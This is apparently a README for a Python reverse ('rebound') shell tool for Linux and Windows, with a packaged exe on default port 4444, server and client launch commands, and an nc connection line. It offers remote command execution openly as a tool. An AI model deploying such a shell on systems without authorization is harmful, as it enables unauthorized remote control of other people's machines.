# Rebound

This is a script for a python-based rebound shell. Unlike other scripts, which only work for Linux, it also works for Windows.<br>
There is also a packaged exe file that can be run directly without a python environment, with the default port 4444<br>

# Usage

### server

```shell
python server_shell.py
```
*The default port is 4444. You can also change the code to the port you want.*<br>
or
```shell
server_shell.exe
```
**If you change the port, you need to repackage it.**

### client

```shell
python client.py -t 127.0.0.1 -p 4444
```
*-t followed by the destination IP, -p followed by the port, must be consistent with the server.*

**You can also use nc to listen**
```shell
nc 127.0.0.1 4444
```

# Note

**The script can only execute a single command and echo.**
**Simply executing the cd command does not switch directories; after it is executed, the directory is still where the script is.**